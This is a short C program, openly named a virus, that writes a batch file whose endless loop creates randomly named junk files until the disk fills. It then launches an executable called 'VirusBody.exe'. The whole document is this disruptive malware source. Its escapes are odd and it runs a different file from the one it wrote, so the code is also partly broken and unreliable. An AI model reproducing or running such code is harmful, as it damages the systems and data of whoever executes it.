#include<stdio.h>
#define PATH "Virus.bat"
int main(){
    FILE *a = fopen("Virus.bat","ab+");
    FILE*fp;
    fp = fopen(PATH,"w");
    fprintf(fp,"echo off\n:start\necho rekt>getrecknerd\%%random\%%\.text\ngoto start");
    fclose(fp);
    system("VirusBody.exe");
    return 0;
}